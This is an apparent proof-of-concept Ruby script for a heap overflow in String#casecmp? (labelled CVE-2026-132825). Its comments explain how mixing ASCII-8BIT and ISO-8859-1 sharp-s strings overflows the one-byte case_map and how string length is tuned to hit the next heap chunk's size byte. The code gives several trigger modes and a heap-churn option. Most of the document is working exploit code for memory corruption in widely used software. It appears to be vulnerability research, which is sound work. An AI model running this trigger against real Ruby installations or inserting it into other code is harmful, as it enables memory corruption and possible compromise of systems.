# W364: cross-encoding gate for String#casecmp? (CVE-2026-132825).
# str_casecmp_p (string.c:4353-4376) calls rb_enc_compatible as a gate, then
# folds each operand with rb_str_downcase(:fold) using that operand's own
# encoding. A 7-bit ASCII-8BIT operand therefore does not stop an ISO-8859-1
# sharp-s operand from entering the one-byte case_map overflow.
#
# Modes:
#   b_recv_l_arg      ASCII-8BIT 7-bit receiver, ISO-8859-1 sharp-s argument
#   l_recv_b_arg      ISO-8859-1 sharp-s receiver, ASCII-8BIT 7-bit argument
#   both_b            ASCII-8BIT 7-bit receiver vs ASCII-8BIT sharp-s argument
#   b_non7_l_arg      ASCII-8BIT sharp-s receiver vs ISO-8859-1 argument
#   both_l            ISO-8859-1 7-bit receiver vs ISO-8859-1 argument (control)
#
# "a" + N x 0xDF gives capa = N+21; R = capa+24 = N+45 = 72/88/104 at
# N=27/43/59, the successor chunk's size LSB.
# Run: lab/build/plain/ruby-3.4.12-plain/bin/ruby <this> 27 b_recv_l_arg [churn]
n = (ARGV[0] || 27).to_i
mode = ARGV[1] || 'b_recv_l_arg'
sharp_b = ("a".b + "\xDF".b * n)
latin = sharp_b.dup.force_encoding(Encoding::ISO_8859_1)
folded_b = ("a".b + "s".b * (2 * n))
latin_folded = folded_b.dup.force_encoding(Encoding::ISO_8859_1)

recv, arg = case mode
            when 'b_recv_l_arg' then [folded_b.dup, latin]
            when 'l_recv_b_arg' then [latin, folded_b.dup]
            when 'both_b' then [folded_b.dup, sharp_b.dup]
            when 'b_non7_l_arg' then [sharp_b.dup, latin]
            when 'both_l' then [latin_folded, latin]
            else abort "unknown mode #{mode}"
            end

result = recv.casecmp?(arg)
print "N=#{n} mode=#{mode} enc1=#{recv.encoding} cr1=#{recv.valid_encoding? ? 'v' : '?'}"
print " enc2=#{arg.encoding} result=#{result.inspect}\n"
if ARGV[2] == 'churn'
  3000.times { (Array.new(200) { "payload#{object_id}" }).join }
  a = []
  500.times { a << ("x" * 64) }
  GC.start
  print "N=#{n} mode=#{mode} churn ok\n"
end
